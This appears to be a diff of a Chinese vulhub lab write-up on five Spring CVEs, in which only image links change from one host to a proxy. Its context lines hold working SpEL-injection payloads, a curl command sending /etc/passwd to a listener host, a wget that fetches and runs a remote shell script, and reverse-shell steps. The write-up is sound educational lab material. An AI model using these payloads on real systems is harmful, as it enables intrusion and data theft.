@@ -33,7 +33,7 @@ full-stack(一站式) 轻量级开源框架。Spring 的理念：不去重新发
 Spring框架包含的功能大约由20个小模块组成。这些模块按组可分为核心容器(Core Container)、数据访问/集成(Data
 Access/Integration)、Web、面向切面编程(AOP和Aspects)、设备(Instrumentation)、消息(Messaging)和测试(Test)。如下图所示：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101926.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101926.png)
 
 # 漏洞环境搭建
 
@@ -57,7 +57,7 @@ Access/Integration)、Web、面向切面编程(AOP和Aspects)、设备(Instrumen
     
     pip install docker-composesudo apt install docker-composedocker-compose -v
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101927.png)image-20210719183746682
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101927.png)image-20210719183746682
 
 到这个地方docker环境就已经搭建好了，这时候需要从github上把vulhub的漏洞环境给clone下来，这里直接clone网不太好，我就直接下载下来了copy到了靶机上
 
@@ -67,7 +67,7 @@ Access/Integration)、Web、面向切面编程(AOP和Aspects)、设备(Instrumen
 
 下载好之后进入spring漏洞环境，这里看到有5个CVE漏洞，我们一个一个来
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101928.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101928.png)
 
 # cve-2016-4977
 
@@ -98,7 +98,7 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
 
 首先进入CVE-2016-4977的docker环境
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101929.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101929.png)
 
 访问url，输入admin/admin
 
@@ -106,11 +106,11 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
     
     http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101930.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101930.png)
 
 出现以下界面则存在漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101932.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101932.png)
 
 使用github上找到的poc对传入值进行处理
 
@@ -122,7 +122,7 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
 
 这里我传入一个whoami，返回了一个payload
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101933.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101933.png)
 
 将这个payload拼接到之前的网址里面访问可以发现，这里返回了一个`[java.lang.UNIXProcess@f2e3e13]`，说明代码已经执行了
 
@@ -130,7 +130,7 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
     
     http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&client_id=acme&scope=openid&redirect_uri=http://test
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101934.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101934.png)
 
 这里使用curl发送一个请求即可得到回显得内容
 
@@ -138,11 +138,11 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
     
     curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101935.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101935.png)
 
 这里再使用nc监听尝试反弹shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101936.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101936.png)
 
 使用到bash反弹，这里需要绕过exec()变形
 
@@ -152,11 +152,11 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
 
 使用http://www.jackson-t.ca/runtime-exec-payloads.html进行payload处理
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101937.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101937.png)
 
 将处理后的命令再放入poc.py
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101938.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101938.png)
 
 得到新的payload并拼接到网址里面
 
@@ -166,7 +166,7 @@ views`来处理错误时，攻击者在被授权的情况下可以通过构造�
 
 然后再访问这个网站即可得到反弹shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101939.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101939.png)
 
 # CVE-2017-4971
 
@@ -181,54 +181,54 @@ Flow的数据绑定问题带来的表达式注入，从而导致任意代码执�
 
 view对象处理用户事件，会根据HTTP参数绑定相应的model
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101940.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101940.png)
 
 如果model没有设置`BinderConfiguration`, 则会调用`addDefaultMappings`函数
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101941.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101941.png)
 
 进一步查看`addDefaultMappings`函数，可以发现输入参数以`fieldMarkerPrefix`(“_”)开头，则会调用`addEmptyValueMapping`函数
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101942.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101942.png)
 
 若`useSpringBeanBinding`参数设置为`false`,则
 `expressionParser`将设置为`SpelExpressionParser`对象的实例，而不是`BeanWrapperExpressionParser`对象的实例。当调用`getValueType`函数时，`SpelExpressionParser`对象将执行表达式，触发任意代码执行
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101943.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101943.png)
 
 ## 漏洞复现
 
 首先进入CVE-2017-4971的docker环境
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101944.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101944.png)
 
 点击登录
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101945.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101945.png)
 
 这里列出了一些登录账户，这里随便使用一个登录即可
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101946.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101946.png)
 
 登录之后显示如下界面
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101947.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101947.png)
 
 然后访问http://192.168.1.10:8080/hotels/1，点击`Book Hotel`
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101948.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101948.png)
 
 这里要把信用卡和名字都填一下，然后点击`Proceed`
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101949.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101949.png)
 
 进入如下页面，此处用bp抓包
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101950.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101950.png)
 
 bp抓包如下所示
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101951.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101951.png)
 
 这里构造一个bash反弹的payload
 
@@ -238,7 +238,7 @@ bp抓包如下所示
 
 打开nc监听端口
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101952.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101952.png)
 
 把构造的payload放入抓到的包里发送
 
@@ -246,7 +246,7 @@ bp抓包如下所示
 
 即可收到反弹shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101953.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101953.png)
 
 # CVE-2017-8046
 
@@ -263,17 +263,17 @@ Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3 Spring Boot version <
 这里直接从补丁分析，从官方的描述来看就是就是Spring-data-
 rest服务处理PATCH请求不当，导致任意表达式执行从而导致的RCE。首先来看下补丁，主要是evaluateValueFromTarget添加了一个校验方法verifyPath，对于不合规格的path直接报异常退出，主要是property.from(pathSource,type)实现，基本逻辑就是通过反射去验证该Field是否存在于bean中
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101954.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101954.png)
 
 ## 漏洞复现
 
 进入CVE-2017-8046的docker环境
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101955.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101955.png)
 
 访问http://192.168.1.10:8080/customers/1返回如下界面则存在漏洞
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101956.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101956.png)
 
 这里先对`customers/1`这个页面bp抓包，还是通过bash反弹，通过处理后得到命令
 
@@ -299,11 +299,11 @@ rest服务处理PATCH请求不当，导致任意表达式执行从而导致的RC
 
 构造后如图所示
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101957.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101957.png)
 
 发包即可得到反弹shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101958.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101958.png)
 
 # CVE-2018-1270
 
@@ -318,7 +318,7 @@ Spring Framework 5.0 - 5.0.5 Spring Framework 4.3 - 4.3.15
 
 由`expression`，`getValue`，`setValue`造成的代码执行，造成这种命令执行是由Spring的SPEL表达式造成的
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817101959.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817101959.png)
 
 SPEL命令执行有两种方式，一是静态方法，二是new 对象
 
@@ -335,11 +335,11 @@ Boolean.class))`获取表达式的值，从而造成命令执行
 
 进入CVE-2018-1270的docker漏洞环境
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102000.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102000.png)
 
 访问http://192.168.1.10:8080/gs-guide-websocket
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102001.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102001.png)
 
 这里直接使用前辈们写好的exp，注意修改一下bash命令和靶机地址即可
 
@@ -349,7 +349,7 @@ Boolean.class))`获取表达式的值，从而造成命令执行
 
 首先还是bash编码
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102002.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102002.png)
 
 修改exp中的靶机ip和反弹命令
 
@@ -363,7 +363,7 @@ Boolean.class))`获取表达式的值，从而造成命令执行
 
 运行poc.py即可得到反弹shell
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102003.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102003.png)
 
 # CVE-2018-1273
 
@@ -380,7 +380,7 @@ REST 3.0 - 3.0.5 (Kay SR5)
 
 这里直接看补丁进行分析，这是一个spel表达式注入漏洞。补丁的内容如下：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102004.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102004.png)
 
 补丁大致就是将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。
 
@@ -390,11 +390,11 @@ SimpleEvaluationContext的权限则小的多，只支持一些map结构，通用
 
 首先进入CVE-2018-1273的docker环境
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102005.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102005.png)
 
 访问http://192.168.1.10:8080/users并用bp抓包
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102006.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102006.png)
 
 这里随便填一下Username跟Password
 
@@ -412,7 +412,7 @@ SimpleEvaluationContext的权限则小的多，只支持一些map结构，通用
     
     username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.1.2:8000/shell.sh")]=111&password=111&repeated=111&Password=111
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102007.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102007.png)
 
 nc打开端口监听再构造payload进行命令执行即可收到反弹shell
 
@@ -420,15 +420,15 @@ nc打开端口监听再构造payload进行命令执行即可收到反弹shell
     
     username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/1")]=111&password=111&repeated=111&Password=111
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102008.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102008.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102009.png)
-
-  
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102009.png)
 
   
 
-**![](https://gitee.com/fuli009/images/raw/master/public/20210817102010.png)**
+  
+
+**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102010.png)**
 
   
 
@@ -459,7 +459,7 @@ Spring系列CVE以及POC编写](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==
 
 原创投稿作者：mathwizard
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210817102011.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210817102011.png)
 
 预览时标签不可点
 
